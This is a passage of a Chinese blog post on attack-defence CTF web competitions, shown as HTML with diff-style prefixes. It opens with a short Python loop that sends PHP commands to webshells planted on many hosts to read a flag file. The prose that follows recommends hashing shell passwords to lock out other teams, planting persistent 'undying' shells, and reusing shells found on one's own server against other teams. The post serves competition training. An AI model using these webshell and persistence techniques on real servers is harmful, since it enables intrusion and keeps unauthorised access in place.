+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;XXXX.&#39;+str(i)+&quot;&#x2F;link.html.php&quot;</span><br><span class="line">myshellpath&#x3D;&quot;testawdveneno@Null&quot;+str(i)</span><br><span class="line">passis&#x3D;md5(myshellpath)</span><br><span class="line">data&#x3D;&#123;passis:&#39;echo file_get_contents(&quot;&#x2F;home&#x2F;flag&quot;);&#39;&#125;</span><br><span class="line">a&#x3D;requests.post(url&#x3D;url, data&#x3D;data)</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，在获取目标的权限后，将获取的shell密码变成一个不可逆的MD5值，便可防止自己的webshell被别人上车，当然也可以上传不死马后自行删除等等策略</p>
+<ol start="7">
+<li>备份源码</li>
+</ol>
+<p>每次比赛无论是防守方的加固导致的服务异常，亦或是某些把受害者吃干抹净擦完嘴就开始删环境，防止其他人接盘的小可爱，每只队伍都应该考虑自己环境能否恢复正常</p>
+<ol start="8">
+<li>化被动为主动</li>
+</ol>
+<p>因为Web线下赛比较容易抓取流量，即使劣势被打，我们也可以及时通过分析流量去查看其他队伍的payload，从而进行反打。</p>
+<p>另外，针对shell复用的情况，如果自己的服务器上被设置了shell，除了立刻删除，也要有这样的思路：如果自己被设置了shell，那么这一般是攻击队伍自动化脚本设置的，就意味着其他非攻击队伍也可能被设置了，路径、密码往往可能都一样，所以可以进一步利用</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2022/86CTF/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2022/82%E7%AB%AF%E5%8F%A3%E5%A4%A7%E5%85%A8%E4%BB%8B%E7%BB%8D/" target="_self">82端口大全介绍</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2022/83%E4%BA%8C%E8%BF%9B%E5%88%B6/" target="_self">83二进制</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
